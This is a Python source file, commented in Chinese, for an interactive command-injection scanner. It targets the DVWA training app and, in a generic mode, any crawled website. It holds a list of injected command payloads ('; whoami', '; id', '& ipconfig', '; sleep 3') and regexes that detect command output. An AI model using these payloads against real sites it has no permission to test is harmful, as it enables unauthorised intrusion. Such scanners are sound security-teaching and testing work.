# DvwaCommandInjectionScanner.py - 支持DVWA+通用模式
import os
import sys
import time
import json
import re
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Optional, Any, Tuple
import requests
from bs4 import BeautifulSoup
from colorama import Fore, init

try:
    from DVWAlogin import DvwaLogin
    from crawler import VulnerabilityCrawler

    print(f"{Fore.GREEN}[✓] 依赖模块加载成功")
except Exception as e:
    print(f"{Fore.RED}[✗] 依赖加载失败: {e}")
    sys.exit(1)

init(autoreset=True)


class DvwaCommandInjectionScanner:
    def __init__(self, session, mode="dvwa", base_url=None, timeout=5):
        """
        命令注入扫描器
        :param session: requests会话对象
        :param mode: "dvwa" 或 "generic"
        :param base_url: 目标网站基础URL（通用模式需要）
        :param timeout: 请求超时时间
        """
        self.session = session
        self.mode = mode
        self.base_url = base_url.rstrip('/') if base_url else None
        self.timeout = timeout

        # DVWA固定配置
        if mode == "dvwa":
            self.target_url = urljoin(self.base_url, "vulnerabilities/exec/")
            self.ip_field = "ip"
            self.submit_field = "Submit"
        else:
            self.target_url = None
            self.ip_field = None
            self.submit_field = "Submit"  # 默认值

        # Payload配置（简化版）
        self.payloads = [
            # 基础探测
            "127.0.0.1",
            "localhost",
            # Unix命令注入
            "; whoami",
            "; id",
            "; pwd",
            "; ls -la",
            # Windows命令注入
            "& whoami",
            "& ipconfig",
            "& dir",
            # 盲注探测（延迟）
            "; sleep 3",
            "| sleep 3"
        ]

        # 检测特征
        self.indicators = [
            r'root|www-data|daemon|nobody',  # Unix用户
            r'uid=\d+|gid=\d+',  # id命令输出
            r'Windows|C:\\\\|System32',  # Windows路径
            r'whoami|ipconfig|/bin/bash'  # 命令关键词
        ]

        # 报告配置
        self.report_dir = os.path.join("scan_result", "DvwaCommandInjectionScanner")
        os.makedirs(self.report_dir, exist_ok=True)

    def is_command_execution_point(self, form_info: Dict, url: str) -> bool:
        """
        智能判断是否为命令执行功能
        :return: 置信度分数 (0-1)
        """
        score = 0
        reasons = []

        # 1. URL路径分析
        path = urlparse(url).path.lower()
        path_keywords = ['exec', 'command', 'cmd', 'ping', 'nslookup', 'dig', 'tool', 'system']
        for keyword in path_keywords:
            if keyword in path:
                score += 0.3
                reasons.append(f"路径包含'{keyword}'")

        # 2. 表单字段分析
        form_data = form_info.get('form_data', {})
        field_names = list(form_data.keys())

        # 检查字段名
        for field in field_names:
            field_lower = field.lower()
            if any(k in field_lower for k in ['ip', 'host', 'domain', 'cmd', 'command', 'exec']):
                score += 0.4
                reasons.append(f"字段名'{field}'疑似命令输入")

        # 3. 页面内容分析（如果有）
        if 'page_content' in form_info:
            content = form_info['page_content'].lower()
            if any(k in content for k in ['ping', '执行命令', 'command', 'nslookup']):
                score += 0.2
                reasons.append("页面内容包含命令执行相关文本")

        return score, reasons

    def scan_command_injection(self, target_url: str, ip_field: str, form_data: Dict = None) -> Dict[str, Any]:
        """
        扫描单个命令注入点
        """
        print(f"\n{Fore.BLUE}{'=' * 60}")
        print(f"{Fore.BLUE}开始扫描: {target_url}")
        print(f"{Fore.BLUE}目标字段: {ip_field}")
        print(f"{Fore.BLUE}{'=' * 60}")

        vulnerabilities = []

        for payload in self.payloads:
            print(f"{Fore.CYAN}[测试] Payload: {payload}")

            # 构造请求数据
            data = form_data.copy() if form_data else {}
            data[ip_field] = payload
            data[self.submit_field] = 'Submit'

            try:
                # 发送请求
                start_time = time.time()
                response = self.session.post(target_url, data=data, timeout=self.timeout)
                elapsed = time.time() - start_time

                # 检查响应
                if any(re.search(pattern, response.text, re.IGNORECASE) for pattern in self.indicators):
                    print(f"{Fore.GREEN}[发现漏洞] Payload: {payload}")
                    vulnerabilities.append({
                        "payload": payload,
                        "response_time": elapsed,
                        "evidence": "检测到命令输出特征"
                    })

            except Exception as e:
                print(f"{Fore.YELLOW}[警告] 请求失败: {e}")
                continue

        return {
            "target_url": target_url,
            "field": ip_field,
            "vulnerabilities": vulnerabilities,
            "vulnerable": len(vulnerabilities) > 0
        }

    def save_report(self, report_data: Dict[str, Any]):
        """保存扫描报告"""
        import datetime
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

        if self.mode == "dvwa":
            filename = f"dvwa_command_injection_{timestamp}.json"
        else:
            filename = f"command_injection_{timestamp}.json"

        report_path = os.path.join(self.report_dir, filename)

        with open(report_path, "w", encoding="utf-8") as f:
            json.dump(report_data, f, indent=4, ensure_ascii=False)

        print(f"{Fore.GREEN}[✓] 报告已保存: {report_path}")

    def detect_dvwa(self):
        """DVWA固定模式扫描"""
        print(f"{Fore.CYAN}[DVWA模式] 使用固定路径: {self.target_url}")

        # 获取CSRF token
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            token_input = soup.find('input', attrs={'name': 'user_token'})
            if token_input:
                csrf_token = token_input.get('value')
                form_data = {'user_token': csrf_token}
            else:
                form_data = {}
        except:
            form_data = {}

        # 扫描
        result = self.scan_command_injection(self.target_url, self.ip_field, form_data)
        self.save_report(result)

        # 打印结果
        if result['vulnerable']:
            print(f"\n{Fore.RED}{'!' * 60}")
            print(f"{Fore.RED}发现命令注入漏洞!")
            print(f"{Fore.RED}{'!' * 60}")
            for vuln in result['vulnerabilities']:
                print(f"  Payload: {vuln['payload']}")
        else:
            print(f"\n{Fore.GREEN}[✓] 未发现漏洞")

    def detect_generic(self, crawl_results: Dict[str, Any]):
        """通用模式：智能识别命令注入点"""
        print(f"{Fore.CYAN}[通用模式] 分析爬虫结果...")

        # 收集所有可能的注入点
        injection_points = []

        # 1. 分析URL参数
        for url_param in crawl_results.get('url_params', []):
            url = url_param['url']
            params = url_param['params']

            for param in params:
                if any(k in param.lower() for k in ['ip', 'host', 'cmd', 'exec']):
                    injection_points.append({
                        'type': 'url_param',
                        'url': url,
                        'field': param,
                        'confidence': 0.8,
                        'reasons': [f"参数名'{param}'疑似命令输入"]
                    })

        # 2. 分析表单
        for form in crawl_results.get('forms', []):
            url = form['url']
            form_data = form.get('form_data', {})

            score, reasons = self.is_command_execution_point(form, url)
            if score >= 0.5:  # 置信度阈值
                # 找出最可能的目标字段
                for field in form_data.keys():
                    if any(k in field.lower() for k in ['ip', 'host', 'cmd', 'exec', 'command']):
                        injection_points.append({
                            'type': 'form',
                            'url': url,
                            'field': field,
                            'form_data': form_data,
                            'confidence': score,
                            'reasons': reasons
                        })
                        break

        if not injection_points:
            print(f"{Fore.YELLOW}[!] 未发现疑似命令注入点")
            return

        # 显示发现的注入点并询问用户
        print(f"\n{Fore.GREEN}[发现 {len(injection_points)} 个疑似命令注入点]")
        for idx, point in enumerate(injection_points, 1):
            print(f"\n{Fore.CYAN}[{idx}] 类型: {point['type']}")
            print(f"    URL: {point['url']}")
            print(f"    字段: {point['field']}")
            print(f"    置信度: {point['confidence']:.1f}")
            print(f"    原因: {'; '.join(point['reasons'])}")

        # 选择扫描目标
        choice = input(
            f"\n{Fore.YELLOW}选择要扫描的注入点编号 (1-{len(injection_points)}, 或 A 扫描全部): ").strip().lower()

        if choice == 'a':
            points_to_scan = injection_points
        elif choice.isdigit() and 1 <= int(choice) <= len(injection_points):
            points_to_scan = [injection_points[int(choice) - 1]]
        else:
            print(f"{Fore.RED}[✗] 无效选择")
            return

        # 执行扫描
        all_results = []
        for point in points_to_scan:
            print(f"\n{Fore.BLUE}{'=' * 60}")
            print(f"{Fore.BLUE}扫描注入点: {point['url']}")
            print(f"{Fore.BLUE}{'=' * 60}")

            if point['type'] == 'url_param':
                # URL参数方式（GET）
                result = self.scan_url_param_injection(point['url'], point['field'])
            else:
                # 表单方式（POST）
                result = self.scan_command_injection(point['url'], point['field'], point.get('form_data'))

            all_results.append(result)

        # 保存总报告
        final_report = {
            "mode": "generic",
            "target_base": self.base_url,
            "injection_points_scanned": len(points_to_scan),
            "points": all_results,
            "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
        }
        self.save_report(final_report)

        # 打印总结
        total_vulns = sum(len(p['vulnerabilities']) for p in all_results)
        print(f"\n{Fore.YELLOW}{'=' * 60}")
        print(f"{Fore.YELLOW}扫描完成 - 发现 {total_vulns} 个漏洞")
        print(f"{Fore.YELLOW}{'=' * 60}")

    def scan_url_param_injection(self, url: str, param: str) -> Dict[str, Any]:
        """扫描URL参数型命令注入"""
        print(f"{Fore.CYAN}[URL参数] 扫描 {url}")

        vulnerabilities = []

        for payload in self.payloads:
            test_url = url.replace(f"{param}=", f"{param}={payload}")
            print(f"{Fore.CYAN}[测试] Payload: {payload}")

            try:
                response = self.session.get(test_url, timeout=self.timeout)

                if any(re.search(pattern, response.text, re.IGNORECASE) for pattern in self.indicators):
                    print(f"{Fore.GREEN}[发现漏洞] Payload: {payload}")
                    vulnerabilities.append({
                        "payload": payload,
                        "evidence": "检测到命令输出特征"
                    })
            except:
                continue

        return {
            "target_url": url,
            "field": param,
            "vulnerabilities": vulnerabilities,
            "vulnerable": len(vulnerabilities) > 0
        }


def main():
    """交互式主函数"""
    print("=" * 60)
    print("    命令注入漏洞扫描程序")
    print("=" * 60)

    print("\n选择目标类型:")
    print("1. DVWA (固定路径)")
    print("2. 其他网站 (自动分析)")

    choice = input("\n请输入选项 (1/2): ").strip()

    if choice == "1":
        # DVWA模式
        url = input("请输入 DVWA 首页 URL: ").strip()
        if not url:
            print(f"{Fore.RED}[✗] URL 不能为空")
            return

        print(f"{Fore.CYAN}[i] 正在登录 DVWA...")
        dvwa = DvwaLogin()
        if not dvwa.login(url):
            print(f"{Fore.RED}[✗] DVWA 登录失败")
            return

        print(f"{Fore.GREEN}[✓] DVWA 登录成功")
        session_info = dvwa.get_session_info()

        scanner = DvwaCommandInjectionScanner(session_info['session'], mode="dvwa", base_url=session_info['base_url'])
        scanner.detect_dvwa()

    elif choice == "2":
        # 通用模式
        url = input("请输入目标网站 URL: ").strip()
        depth_input = input("请输入爬取深度 (默认2): ").strip()
        crawl_depth = int(depth_input) if depth_input.isdigit() else 2

        print(f"\n{Fore.CYAN}[i] 初始化通用模式...")
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0'})

        # 执行爬取
        print(f"{Fore.CYAN}[i] 正在爬取网站...")
        crawler = VulnerabilityCrawler(url, max_depth=crawl_depth)
        crawler.crawl(url)
        crawl_results = crawler.get_results()

        print(f"{Fore.GREEN}[✓] 爬取完成，发现 {len(crawl_results.get('forms', []))} 个表单")

        # 扫描
        scanner = DvwaCommandInjectionScanner(session, mode="generic", base_url=url)
        scanner.detect_generic(crawl_results)

    else:
        print(f"{Fore.RED}[✗] 无效选项")


if __name__ == "__main__":
    main()